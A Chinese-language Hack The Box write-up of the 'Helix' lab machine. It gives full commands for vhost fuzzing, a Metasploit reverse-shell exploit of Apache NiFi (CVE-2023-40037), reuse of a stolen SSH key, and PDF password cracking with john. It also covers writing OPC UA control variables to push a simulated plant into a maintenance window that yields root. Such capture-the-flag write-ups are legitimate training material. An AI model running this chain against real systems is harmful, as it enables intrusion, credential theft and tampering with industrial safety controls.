# HTB Helix Writeup

## 一、靶机信息

目标：`Helix`
最终目标：

- 获取 `user.txt`
- 获取 `root.txt`

------

## 二、信息收集

### 1. 端口扫描

先对目标做全端口扫描：

```bash
nmap -p- -T4 10.129.33.17
```

再对开放端口做服务识别：

```bash
nmap -sC -sV -p 22,80,8080 10.129.33.17
```

可以发现目标存在 Web 服务，同时存在 SSH。

------

### 2. Web 枚举

先访问首页，观察站点结构：

```bash
curl -i http://10.129.33.17/
```

对目录和虚拟主机做枚举。该题关键点在于 **vhost fuzzing**，最终可以发现新的子域名：

```bash
ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-fs 0
```

得到：

```text
flow.helix.htb
```

将其加入 hosts：

```bash
echo "10.129.33.17 helix.htb flow.helix.htb" | sudo tee -a /etc/hosts
```

访问：

```bash
http://flow.helix.htb
```

可以识别出目标使用的是 **Apache NiFi**。

------

## 三、初始立足点：Apache NiFi RCE

### 1. 漏洞确认

该靶机使用的版本为：

- **Apache NiFi 1.21.0**

对应利用链：

- **CVE-2023-40037**

可以直接使用 Metasploit 模块，但需要注意模块默认 jar 路径与靶机实际路径不一致。

------

### 2. 修补 Metasploit 模块路径

靶机实际 jar 路径为：

```text
/opt/nifi-1.21.0/lib/h2-2.1.214.jar
```

需要把 MSF 模块中对应路径修正为该位置，否则利用会失败。

之后进入 msfconsole：

```bash
msfconsole
```

使用模块：

```bash
use exploit/linux/http/apache_nifi_h2_rce
set RHOSTS flow.helix.htb
set RPORT 8080
set TARGETURI /
set LHOST <your_vpn_ip>
set LPORT 4444
run
```

成功后可获得反弹 shell。

------

## 四、用户权限获取

### 1. 枚举 NiFi 目录

获得 shell 后，重点看 NiFi 工作目录和支持包：

```bash
find /opt/nifi-1.21.0 -type f 2>/dev/null | grep -i support
find / -type f 2>/dev/null | grep -i bundle
```

在 support bundles 中可以找到备份私钥：

```text
operator_id_ed25519.bak
```

将其取回本地：

```bash
cat /path/to/operator_id_ed25519.bak
```

或通过下载方式取回。

------

### 2. 使用私钥登录 operator

本地保存为：

```bash
chmod 600 operator_id_ed25519.bak
ssh -i operator_id_ed25519.bak operator@helix.htb
```

登录成功后即可获得 `operator` 用户权限。

读取用户 flag：

```bash
cat /home/operator/user.txt
```

------

## 五、提权前枚举

### 1. sudo 权限检查

```bash
sudo -l
```

可以看到：

```text
(root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

说明 `operator` 可以无密码执行该脚本。

查看脚本内容：

```bash
sed -n '1,220p' /usr/local/sbin/helix-maint-console
```

脚本逻辑很简单：

- 检查 `/opt/helix/state/maintenance_window`
- 若该文件存在且内容为未来时间戳，则允许进入 root shell

也就是说：

**提权核心并不在 sudo 本身，而在于如何触发 maintenance window 文件被 PLC/控制逻辑写入。**

------

## 六、关键线索：PNG 与加密 PDF

### 1. operator 家目录文件

枚举用户目录：

```bash
find /home/operator -maxdepth 3 -type f 2>/dev/null | sort
```

可看到两个关键文件：

- `control systems diagram.png`
- `Operator Control & Safety Guide.pdf`

------

### 2. PNG 线索

打开图片后可以看到控制系统拓扑图，给出了核心信息：

- 本地 **OPC UA** 服务地址：
  `opc.tcp://127.0.0.1:4840/helix/`
- 可写变量：
  - `Calibration Offset`
  - `Mode`
  - `Test Override`
  - `Reset Trip`
- 安全区变量只读：
  - `Rods Inserted`
  - `Emergency Cooling`

该图说明：

**Root 链与本地 OPC UA 控制逻辑有关。**

------

### 3. PDF 解密

PDF 被加密，需要先破解密码。

先把 PDF 从靶机拷回 Kali：

```bash
scp -i operator_id_ed25519.bak operator@helix.htb:"/home/operator/Operator Control & Safety Guide.pdf" .
```

转 hash：

```bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
```

用 john 破解：

```bash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
john pdf.hash --show
```

可得到密码：

```text
operator1
```

解密：

```bash
qpdf --password='operator1' --decrypt "Operator Control & Safety Guide.pdf" out.pdf
```

------

## 七、PDF 内容分析

PDF 中给出了维护窗口逻辑：

### 关键变量

- `Mode`：`NORMAL / MAINTENANCE`
- `TestOverride`
- `ResetTrip`
- `CalibrationOffset`
- `TripActive`

### 关键逻辑

进入维护模式需要：

1. `Mode` 切换到 `MAINTENANCE`
2. 启用 `TestOverride`
3. 逐步增加 `CalibrationOffset`

### 维护窗口条件

维护窗口会在以下条件下打开：

- 温度约达到 **295°C**
  **或**
- 压力约达到 **73 bar**
- 同时低于 trip 阈值：
  - 温度 < **305°C**
  - 压力 < **75 bar**
- 且：
  - `TripActive = FALSE`

这说明：
**我们必须通过本地 OPC UA 服务把系统推到“维护窗口”附近，但不能触发安全跳闸。**

------

## 八、连接本地 OPC UA 服务

### 1. 浏览节点

使用本地脚本或自写客户端浏览节点，最终可得到核心节点：

```text
ns=2;i=3   TemperatureRaw
ns=2;i=4   Temperature
ns=2;i=5   Pressure
ns=2;i=6   CalibrationOffset

ns=2;i=8   RodsInserted
ns=2;i=9   EmergencyCooling
ns=2;i=10  TripActive

ns=2;i=12  Mode
ns=2;i=13  TestOverride
ns=2;i=14  ResetTrip
```

------

### 2. 关键写入目标

重点写入：

- `ns=2;i=12` → `Mode`
- `ns=2;i=13` → `TestOverride`
- `ns=2;i=6` → `CalibrationOffset`

只读观察：

- `ns=2;i=4` → `Temperature`
- `ns=2;i=5` → `Pressure`
- `ns=2;i=10` → `TripActive`

------

## 九、Root 提权

### 1. 先在 SSH 窗口持续检测维护窗口

登录 `operator` 后开启循环：

```bash
while true; do
  sudo /usr/local/sbin/helix-maint-console && break
  sleep 0.2
done
```

这样只要维护窗口被打开，就会立即进入 root shell。

------

### 2. 在 Kali 侧通过 OPC UA 推状态

先设置维护模式和 override：

```bash
python3 write_opcua.py 'ns=2;i=13' bool true
sleep 1
python3 write_opcua.py 'ns=2;i=12' string MAINTENANCE
sleep 1
```

然后逐步调高 `CalibrationOffset`，并观察温度/压力/Trip 状态：

```bash
python3 write_opcua.py 'ns=2;i=6' double 10.6
sleep 1
python3 browse_ns2.py | grep -Ei 'Temperature|Pressure|CalibrationOffset|TripActive|Mode|TestOverride'
```

最终命中时状态大致为：

```text
Temperature ≈ 294.99
Pressure ≈ 69.27
CalibrationOffset = 10.6
TripActive = False
Mode = MAINTENANCE
TestOverride = True
```

虽然压力未到 73，但温度已接近 PDF 中描述的维护窗口边界，系统成功写入了：

```text
/opt/helix/state/maintenance_window
```

此时 SSH 窗口中的循环命中，得到输出：

```text
[+] Privileged maintenance access granted
[!] Window expires in 119 seconds
[!] Session will be terminated automatically
root@helix:/home/operator#
```

------

### 3. 读取 root flag

```bash
whoami
id
cat /root/root.txt
```

------

## 十、攻击链总结

完整利用链如下：

### 1. 信息收集

- 端口扫描发现 Web/SSH
- vhost fuzzing 找到 `flow.helix.htb`

### 2. 初始立足点

- 识别 Apache NiFi 1.21.0
- 利用 **CVE-2023-40037**
- 修补 MSF 模块 jar 路径为：
  `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`

### 3. 用户权限

- 枚举 NiFi support bundles
- 获取 `operator_id_ed25519.bak`
- SSH 登录 `operator`

### 4. Root 提权

- 发现可 sudo 执行 `/usr/local/sbin/helix-maint-console`
- 从用户目录获取 PNG 与加密 PDF
- 破解 PDF 密码 `operator1`
- 从 PDF 中得到维护窗口触发逻辑
- 连接本地 OPC UA 服务
- 设置：
  - `Mode = MAINTENANCE`
  - `TestOverride = TRUE`
  - 缓慢/逐步调高 `CalibrationOffset`
- 命中 maintenance window
- 通过 `helix-maint-console` 获取 root shell

------

## 十一、关键经验点

### 1. vhost fuzzing 很关键

单看主站很难直达利用点，必须枚举虚拟主机找到 `flow.helix.htb`。

### 2. MSF 模块不一定开箱即用

NiFi 利用过程中，模块内置 jar 路径与实际环境不一致，需要手动修补。

### 3. support bundles / backup 文件经常藏敏感信息

该题的用户权限并不是常规密码喷洒，而是从支持包中找到私钥备份。

### 4. PDF 不是干扰项，而是主线

很多靶机会把关键业务逻辑放在“运维文档”“操作手册”里，本题 root 的 intended path 正是如此。

### 5. 工控/OPC UA 题目核心在“状态逻辑”

并不是单纯写某个值就能提权，而是需要理解：

- 哪些变量可写
- 写入顺序
- 触发条件
- 安全联锁逻辑

------

## 十二、最终命令摘录

### 枚举 vhost

```bash
ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### 登录 operator

```bash
ssh -i operator_id_ed25519.bak operator@helix.htb
```

### 破解 PDF

```bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
john pdf.hash --show
```

### 维护窗口监控

```bash
while true; do
  sudo /usr/local/sbin/helix-maint-console && break
  sleep 0.2
done
```

### OPC UA 关键写入

```bash
python3 write_opcua.py 'ns=2;i=13' bool true
python3 write_opcua.py 'ns=2;i=12' string MAINTENANCE
python3 write_opcua.py 'ns=2;i=6' double 10.6
```

------

## 十三、结论

`Helix` 是一台链路非常完整的靶机，考察点覆盖：

- Web 枚举
- Apache NiFi RCE
- 敏感文件/备份利用
- SSH 私钥复用
- 文档解密与业务逻辑分析
- OPC UA / 工控协议交互
- 基于状态机的提权